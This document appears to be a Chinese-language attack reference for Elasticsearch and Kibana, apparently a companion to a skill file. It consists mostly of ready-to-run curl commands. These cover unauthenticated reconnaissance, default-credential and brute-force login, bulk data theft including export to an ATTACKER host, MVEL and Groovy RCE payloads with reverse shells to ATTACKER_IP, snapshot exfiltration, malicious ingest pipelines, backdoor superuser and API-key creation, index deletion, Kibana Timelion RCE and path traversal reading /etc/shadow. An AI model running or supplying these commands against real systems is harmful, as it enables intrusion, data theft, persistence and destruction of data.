# Elasticsearch 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 服务发现与信息收集

### 利用条件
- 目标开放 9200（HTTP）或 9300（Transport）端口
- 网络可达，无防火墙拦截

### 基础探测

```bash
# 获取集群名称、版本号、Lucene 版本
curl http://TARGET:9200/

# 集群健康状态
curl http://TARGET:9200/_cluster/health?pretty

# 集群状态（包含索引元数据、分片分配）
curl http://TARGET:9200/_cluster/state?pretty

# 集群设置（动态/静态配置）
curl http://TARGET:9200/_cluster/settings?pretty
curl 'http://TARGET:9200/_cluster/settings?include_defaults=true&pretty'
```

### 节点信息

```bash
# 节点列表
curl http://TARGET:9200/_cat/nodes?v

# 节点详细信息（IP、版本、JVM、OS）
curl http://TARGET:9200/_nodes?pretty

# 节点统计（CPU、内存、磁盘、网络）
curl http://TARGET:9200/_nodes/stats?pretty

# 节点配置
curl http://TARGET:9200/_nodes/settings?pretty
```

### Cat API 速查

```bash
# 索引列表（名称、文档数、大小）
curl http://TARGET:9200/_cat/indices?v

# 分片状态
curl http://TARGET:9200/_cat/shards?v

# 别名列表
curl http://TARGET:9200/_cat/aliases?v

# 插件列表
curl http://TARGET:9200/_cat/plugins?v

# 模板列表
curl http://TARGET:9200/_cat/templates?v

# 线程池状态
curl http://TARGET:9200/_cat/thread_pool?v
```

**攻击效果**: 获取集群完整拓扑、版本信息、节点 IP 地址，为后续攻击提供决策依据。

---

## 2. 认证与访问控制

### 利用条件
- 目标可能配置了 X-Pack Security 或 Search Guard
- 需要判断认证状态并尝试绕过

### 无认证检测

```bash
# 直接访问根路径
curl -v http://TARGET:9200/

# 返回 200 + JSON → 无认证
# 返回 401 → 有认证保护
# 返回 403 → 认证启用但权限不足

# 尝试敏感端点
curl http://TARGET:9200/_cat/indices?v
curl http://TARGET:9200/_cluster/health
curl http://TARGET:9200/_search
```

### 默认凭证尝试

```bash
# elastic 用户（X-Pack 默认超级用户）
curl -u elastic:changeme http://TARGET:9200/
curl -u elastic:elastic http://TARGET:9200/

# 其他常见凭证
curl -u admin:admin http://TARGET:9200/
curl -u kibana:changeme http://TARGET:9200/
curl -u logstash_system:changeme http://TARGET:9200/
curl -u beats_system:changeme http://TARGET:9200/
curl -u apm_system:changeme http://TARGET:9200/
curl -u remote_monitoring_user:changeme http://TARGET:9200/

# 批量测试
for cred in "elastic:changeme" "elastic:elastic" "admin:admin" "kibana:changeme" "logstash_system:changeme"; do
  echo "Testing $cred"
  curl -s -o /dev/null -w "%{http_code}" -u $cred http://TARGET:9200/
  echo ""
done
```

### 暴力破解

```bash
# Hydra
hydra -L users.txt -P passwords.txt TARGET http-get /_search

# 自定义用户列表
# elastic, admin, kibana, logstash_system, beats_system, apm_system
```

### X-Pack Security 枚举

```bash
# 列出用户（需管理权限）
curl -u USER:PASS http://TARGET:9200/_xpack/security/user?pretty
curl -u USER:PASS http://TARGET:9200/_security/user?pretty

# 列出角色
curl -u USER:PASS http://TARGET:9200/_xpack/security/role?pretty
curl -u USER:PASS http://TARGET:9200/_security/role?pretty

# 查看当前用户权限
curl -u USER:PASS http://TARGET:9200/_security/_authenticate?pretty

# 列出 API Key
curl -u USER:PASS http://TARGET:9200/_security/api_key?pretty
```

**关键判断**: 如果返回 200 且无需认证，后续所有操作均可直连；如果有认证，必须先获取有效凭证。

---

## 3. 索引数据枚举与窃取

### 利用条件
- 已获得 ES 访问权限（未授权或已知凭证）
- 目标 ES 中存储有业务数据

### 索引枚举

```bash
# 列出所有索引（含文档数、大小）
curl http://TARGET:9200/_cat/indices?v

# 按大小排序
curl http://TARGET:9200/_cat/indices?v&s=store.size:desc

# 列出所有别名
curl http://TARGET:9200/_aliases?pretty

# 获取索引映射（字段结构，判断是否有敏感字段）
curl http://TARGET:9200/INDEX_NAME/_mapping?pretty

# 获取所有索引映射
curl http://TARGET:9200/_all/_mapping?pretty

# 获取索引设置
curl http://TARGET:9200/INDEX_NAME/_settings?pretty
curl http://TARGET:9200/_all/_settings?pretty

# 获取索引统计（文档数、大小等）
curl http://TARGET:9200/INDEX_NAME/_stats?pretty
```

### 数据搜索

```bash
# 搜索所有文档（默认返回 10 条）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}}
  }'

# 增加返回数量（最大 10000）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 10000
  }'

# 搜索特定索引
curl -X POST http://TARGET:9200/INDEX_NAME/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 1000
  }'

# 多索引搜索
curl -X POST http://TARGET:9200/index1,index2/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 1000
  }'
```

### 敏感字段搜索

```bash
# 搜索包含 password 的文档
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "password",
        "fields": ["*"]
      }
    }
  }'

# 搜索包含 token 的文档
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "token",
        "fields": ["*"]
      }
    }
  }'

# 搜索包含 email 的文档
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "email",
        "fields": ["*"]
      }
    }
  }'

# 搜索信用卡号模式（简单通配）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "query_string": {
        "query": "credit_card OR card_number OR cvv OR expiry"
      }
    }
  }'

# 搜索包含特定关键词的字段名
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "exists": {"field": "password"}
    }
  }'
```

### _scroll API 批量导出

```bash
# 步骤 1: 初始化 scroll（设置保持时间和每批大小）
curl -X POST http://TARGET:9200/INDEX_NAME/_search?scroll=5m \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 5000
  }' > /tmp/es_scroll_init.json

# 提取 scroll_id
# 响应中包含 "_scroll_id" 字段

# 步骤 2: 持续获取下一批（使用上一步的 _scroll_id）
curl -X POST http://TARGET:9200/_search/scroll \
  -H 'Content-Type: application/json' -d '{
    "scroll": "5m",
    "scroll_id": "SCROLL_ID_FROM_PREVIOUS_RESPONSE"
  }'

# 重复步骤 2 直到 hits.hits 为空数组

# 步骤 3: 清理 scroll 上下文
curl -X DELETE http://TARGET:9200/_search/scroll \
  -H 'Content-Type: application/json' -d '{
    "scroll_id": "SCROLL_ID_HERE"
  }'
```

### elasticdump 批量导出

```bash
# 安装
npm install -g elasticdump

# 导出索引数据到 JSON 文件
elasticdump --input=http://TARGET:9200/INDEX_NAME --output=/tmp/index_data.json --type=data

# 导出索引映射
elasticdump --input=http://TARGET:9200/INDEX_NAME --output=/tmp/index_mapping.json --type=mapping

# 导出所有索引
elasticdump --input=http://TARGET:9200 --output=/tmp/all_data.json --type=data --all=true

# 导出到另一个 ES 实例
elasticdump --input=http://TARGET:9200/INDEX_NAME --output=http://ATTACKER:9200/stolen_data --type=data

# 带认证导出
elasticdump --input=http://USER:PASS@TARGET:9200/INDEX_NAME --output=/tmp/data.json --type=data
```

**攻击效果**: 获取目标 ES 中所有索引数据，包括可能存在的用户凭证、个人信息、业务敏感数据。

---

## 4. MVEL/Groovy 脚本 RCE

### 利用条件
- **MVEL RCE (CVE-2014-3120)**: Elasticsearch < 1.2，且至少存在一条已索引的文档
- **Groovy 沙箱逃逸 (CVE-2015-1427)**: Elasticsearch 1.3.x - 1.4.x（< 1.4.3）
- 动态脚本功能已启用（旧版本默认启用）

### 前置准备：确保有文档

```bash
# 如果目标 ES 是空的，先插入一条文档（MVEL 需要至少一条文档才能触发脚本）
curl -X POST http://TARGET:9200/test_index/test_type/1 \
  -H 'Content-Type: application/json' -d '{
    "name": "test"
  }'
```

### MVEL 表达式注入 (CVE-2014-3120)

```bash
# 执行 id 命令
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {"match_all": {}},
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.Class.forName(\"java.lang.String\")).invoke(null,\"id\")"
          }
        }
      }
    }
  }'

# 读取 /etc/passwd（通过 BufferedReader）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {"match_all": {}},
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.Class.forName(\"java.lang.String\")).invoke(null,\"cat /etc/passwd\"))).readLine()"
          }
        }
      }
    }
  }'

# 反弹 shell
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {"match_all": {}},
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.Class.forName(\"java.lang.String\")).invoke(null,\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\")"
          }
        }
      }
    }
  }'
```

### Groovy 沙箱逃逸 (CVE-2015-1427)

```bash
# 执行 id 命令
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = \"id\".execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'

# 执行任意命令（替换 COMMAND）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = [\"bash\", \"-c\", \"COMMAND\"].execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'

# 反弹 shell
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = [\"bash\", \"-c\", \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"].execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'

# 使用 java.lang.Runtime（另一种绕过方式）
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "size": 1,
    "script_fields": {
      "rce": {
        "script": "java.lang.Runtime.getRuntime().exec(\"id\")"
      }
    }
  }'
```

**攻击效果**: 在 ES 服务器上以 elasticsearch 用户权限执行任意系统命令。影响范围仅限旧版本（< 1.4.3），现代版本已完全移除 MVEL 和不安全的 Groovy 脚本支持。

---

## 5. Painless 脚本执行

### 利用条件
- Elasticsearch >= 5.0（Painless 是默认脚本引擎）
- 脚本功能已启用（默认启用 inline scripts）
- Painless 本身是沙箱化的，通常无法直接 RCE，但可用于数据操作

### 内联脚本查询

```bash
# 通过 Painless 脚本计算字段
curl -X POST http://TARGET:9200/INDEX_NAME/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "script_fields": {
      "extracted": {
        "script": {
          "lang": "painless",
          "source": "doc[params.field].value",
          "params": {"field": "password"}
        }
      }
    }
  }'

# 通过 _update_by_query 修改数据
curl -X POST http://TARGET:9200/INDEX_NAME/_update_by_query \
  -H 'Content-Type: application/json' -d '{
    "script": {
      "lang": "painless",
      "source": "ctx._source.status = params.new_status",
      "params": {"new_status": "compromised"}
    },
    "query": {"match_all": {}}
  }'
```

### 存储脚本

```bash
# 创建存储脚本
curl -X POST http://TARGET:9200/_scripts/my_script \
  -H 'Content-Type: application/json' -d '{
    "script": {
      "lang": "painless",
      "source": "doc[params.field].value"
    }
  }'

# 调用存储脚本
curl -X POST http://TARGET:9200/INDEX_NAME/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "script_fields": {
      "result": {
        "script": {
          "id": "my_script",
          "params": {"field": "password"}
        }
      }
    }
  }'

# 列出存储脚本（检查是否有已存在的脚本）
curl http://TARGET:9200/_cluster/state/metadata?pretty
```

**关键判断**: Painless 脚本在现代 ES 中是沙箱化的，通常不能直接执行系统命令。主要用于数据提取和篡改，而非 RCE。

---

## 6. 快照仓库滥用

### 利用条件
- 有 `_snapshot` API 的写权限
- ES 节点本地有可写目录（用于 fs 类型仓库）
- 或有可访问的远程存储（S3、HDFS 等）

### 注册快照仓库

```bash
# 注册 fs 类型仓库（写到本地目录）
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "fs",
    "settings": {
      "location": "/tmp/snapshots"
    }
  }'

# 注册 URL 类型仓库（只读，用于恢复外部数据）
curl -X PUT http://TARGET:9200/_snapshot/url_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "url",
    "settings": {
      "url": "file:///tmp/snapshots"
    }
  }'

# 列出所有已注册的仓库
curl http://TARGET:9200/_snapshot?pretty

# 查看仓库详情
curl http://TARGET:9200/_snapshot/REPO_NAME?pretty
```

### 创建快照（数据窃取）

```bash
# 创建所有索引的快照
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo/full_snapshot?wait_for_completion=true

# 创建特定索引的快照
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo/partial_snapshot?wait_for_completion=true \
  -H 'Content-Type: application/json' -d '{
    "indices": "INDEX_NAME_1,INDEX_NAME_2",
    "include_global_state": false
  }'

# 查看快照状态
curl http://TARGET:9200/_snapshot/exfil_repo/full_snapshot?pretty

# 列出仓库中的所有快照
curl http://TARGET:9200/_snapshot/exfil_repo/_all?pretty
```

### 从快照恢复

```bash
# 恢复快照（所有索引）
curl -X POST http://TARGET:9200/_snapshot/exfil_repo/full_snapshot/_restore

# 恢复到新索引名（避免覆盖原数据）
curl -X POST http://TARGET:9200/_snapshot/exfil_repo/full_snapshot/_restore \
  -H 'Content-Type: application/json' -d '{
    "indices": "INDEX_NAME",
    "rename_pattern": "(.+)",
    "rename_replacement": "restored_$1"
  }'
```

**攻击效果**: 将目标 ES 数据以快照形式导出到攻击者可访问的路径，或恢复其他环境的快照到当前集群进行分析。

---

## 7. Ingest Pipeline 注入

### 利用条件
- 有 `_ingest/pipeline` API 的写权限
- 目标有活跃的数据索引流程（Pipeline 会在文档索引时自动执行）

### 枚举现有 Pipeline

```bash
# 列出所有 Pipeline
curl http://TARGET:9200/_ingest/pipeline?pretty

# 查看特定 Pipeline
curl http://TARGET:9200/_ingest/pipeline/PIPELINE_NAME?pretty
```

### 创建恶意 Pipeline

```bash
# 数据拦截 Pipeline（向所有新文档添加标记字段）
curl -X PUT http://TARGET:9200/_ingest/pipeline/interceptor \
  -H 'Content-Type: application/json' -d '{
    "description": "data interceptor",
    "processors": [
      {
        "set": {
          "field": "intercepted_at",
          "value": "{{_ingest.timestamp}}"
        }
      },
      {
        "set": {
          "field": "original_index",
          "value": "{{_index}}"
        }
      }
    ]
  }'

# 数据篡改 Pipeline（修改特定字段值）
curl -X PUT http://TARGET:9200/_ingest/pipeline/tamper \
  -H 'Content-Type: application/json' -d '{
    "description": "data tamper",
    "processors": [
      {
        "set": {
          "field": "status",
          "value": "approved",
          "override": true
        }
      }
    ]
  }'

# 数据复制 Pipeline（将数据副本发送到另一个索引）
curl -X PUT http://TARGET:9200/_ingest/pipeline/exfil \
  -H 'Content-Type: application/json' -d '{
    "description": "data copy",
    "processors": [
      {
        "set": {
          "field": "_index",
          "value": "exfiltrated_data"
        }
      }
    ]
  }'
```

### 将 Pipeline 绑定到索引

```bash
# 设置索引默认 Pipeline（所有新文档自动经过此 Pipeline）
curl -X PUT http://TARGET:9200/INDEX_NAME/_settings \
  -H 'Content-Type: application/json' -d '{
    "index.default_pipeline": "interceptor"
  }'

# 手动使用 Pipeline 索引文档
curl -X POST http://TARGET:9200/INDEX_NAME/_doc?pipeline=interceptor \
  -H 'Content-Type: application/json' -d '{
    "test": "data"
  }'
```

### 清理

```bash
# 删除 Pipeline
curl -X DELETE http://TARGET:9200/_ingest/pipeline/interceptor

# 移除索引默认 Pipeline
curl -X PUT http://TARGET:9200/INDEX_NAME/_settings \
  -H 'Content-Type: application/json' -d '{
    "index.default_pipeline": null
  }'
```

**攻击效果**: 在数据进入 ES 时自动拦截、篡改或复制，可用于长期窃听和数据操纵。

---

## 8. 集群配置篡改

### 利用条件
- 有集群管理 API 的写权限
- 目标环境允许动态修改集群设置

### 查看当前配置

```bash
# 集群设置
curl http://TARGET:9200/_cluster/settings?pretty

# 包含默认设置
curl 'http://TARGET:9200/_cluster/settings?include_defaults=true&pretty'

# 索引模板
curl http://TARGET:9200/_template?pretty
curl http://TARGET:9200/_index_template?pretty
```

### 修改集群设置

```bash
# 启用动态脚本（如果被禁用）
curl -X PUT http://TARGET:9200/_cluster/settings \
  -H 'Content-Type: application/json' -d '{
    "transient": {
      "script.allowed_types": "both",
      "script.allowed_contexts": "search,update"
    }
  }'

# 修改快照仓库路径（扩展可写目录）
curl -X PUT http://TARGET:9200/_cluster/settings \
  -H 'Content-Type: application/json' -d '{
    "transient": {
      "path.repo": ["/tmp", "/var/backups"]
    }
  }'
```

### 用户管理（X-Pack）

```bash
# 创建后门超级用户
curl -X POST http://TARGET:9200/_xpack/security/user/backdoor \
  -H 'Content-Type: application/json' -d '{
    "password": "Str0ngP@ss!",
    "roles": ["superuser"],
    "full_name": "System Account",
    "email": "system@internal"
  }'

# 创建 API Key（更隐蔽的持久化方式）
curl -X POST http://TARGET:9200/_security/api_key \
  -H 'Content-Type: application/json' -d '{
    "name": "monitoring-key",
    "role_descriptors": {
      "admin": {
        "cluster": ["all"],
        "index": [{"names": ["*"], "privileges": ["all"]}]
      }
    }
  }'

# 修改现有用户密码
curl -X POST http://TARGET:9200/_xpack/security/user/elastic/_password \
  -H 'Content-Type: application/json' -d '{
    "password": "new_password_here"
  }'
```

### 索引操作

```bash
# 删除索引（破坏性操作）
curl -X DELETE http://TARGET:9200/INDEX_NAME

# 关闭索引（使其不可访问但不删除）
curl -X POST http://TARGET:9200/INDEX_NAME/_close

# 修改索引映射（添加字段）
curl -X PUT http://TARGET:9200/INDEX_NAME/_mapping \
  -H 'Content-Type: application/json' -d '{
    "properties": {
      "backdoor_field": {"type": "text"}
    }
  }'
```

**攻击效果**: 完全控制集群配置，可创建后门账户、修改安全设置、操纵索引数据。

---

## 9. Kibana 利用

### 利用条件
- Kibana 服务暴露（默认端口 5601）
- Kibana 无认证或使用与 ES 相同的弱凭证

### 发现与访问

```bash
# 检测 Kibana 是否存在
curl http://TARGET:5601/api/status
curl http://TARGET:5601/app/kibana

# Kibana 版本信息
curl http://TARGET:5601/api/status | python3 -m json.tool

# 检查认证状态
curl -v http://TARGET:5601/api/saved_objects/_find?type=dashboard
```

### Dev Tools 控制台

```bash
# Kibana Dev Tools 提供完整的 ES API 访问
# 通过浏览器访问: http://TARGET:5601/app/dev_tools#/console

# 通过 API 执行 ES 查询（Kibana 作为代理）
curl -X POST http://TARGET:5601/api/console/proxy?path=/_search&method=GET \
  -H 'Content-Type: application/json' \
  -H 'kbn-xsrf: true' \
  -d '{"query": {"match_all": {}}}'
```

### Saved Objects 利用

```bash
# 列出所有 saved objects（dashboard, visualization, search）
curl http://TARGET:5601/api/saved_objects/_find?type=dashboard&per_page=100 \
  -H 'kbn-xsrf: true'

curl http://TARGET:5601/api/saved_objects/_find?type=visualization&per_page=100 \
  -H 'kbn-xsrf: true'

curl http://TARGET:5601/api/saved_objects/_find?type=index-pattern&per_page=100 \
  -H 'kbn-xsrf: true'

# 导出 saved objects
curl -X POST http://TARGET:5601/api/saved_objects/_export \
  -H 'Content-Type: application/json' \
  -H 'kbn-xsrf: true' \
  -d '{"type": ["dashboard", "visualization", "search"]}' \
  > /tmp/kibana_objects.ndjson
```

### Kibana 已知漏洞

```bash
# CVE-2019-7609: Kibana Timelion 原型污染 RCE (Kibana < 6.6.1)
# 在 Timelion 中输入:
# .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND");process.exit()//')
# .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
# 然后访问 Canvas 页面触发

# CVE-2021-22986: Kibana SSRF (特定版本)
# 通过 Kibana 发起服务端请求到内部服务
```

**关键判断**: Kibana 暴露等同于 ES 完全暴露（Kibana 是 ES 的前端），且额外提供了 saved objects、dashboard 等敏感信息。旧版本 Kibana 存在 RCE 漏洞（如 Timelion 原型污染）。

---

## 10. 路径穿越漏洞

### 利用条件
- Elasticsearch < 1.4.3
- 安装了 site plugin（如 head, kopf, bigdesk 等）

### 文件读取

```bash
# 读取系统文件
curl http://TARGET:9200/_plugin/head/../../../../../../etc/passwd
curl http://TARGET:9200/_plugin/head/../../../../../../etc/shadow
curl http://TARGET:9200/_plugin/head/../../../../../../etc/hosts

# 读取 ES 配置文件
curl http://TARGET:9200/_plugin/head/../../../../../../etc/elasticsearch/elasticsearch.yml
curl http://TARGET:9200/_plugin/head/../../../../../../etc/elasticsearch/jvm.options

# 读取 ES 日志
curl http://TARGET:9200/_plugin/head/../../../../../../var/log/elasticsearch/elasticsearch.log

# 尝试其他常见 plugin 名称
curl http://TARGET:9200/_plugin/kopf/../../../../../../etc/passwd
curl http://TARGET:9200/_plugin/bigdesk/../../../../../../etc/passwd
curl http://TARGET:9200/_plugin/marvel/../../../../../../etc/passwd
```

**攻击效果**: 读取 ES 服务器上的任意文件，可获取系统凭证、ES 配置（含可能的认证信息）、其他服务配置等。仅影响 ES < 1.4.3 且安装了 site plugin 的环境。
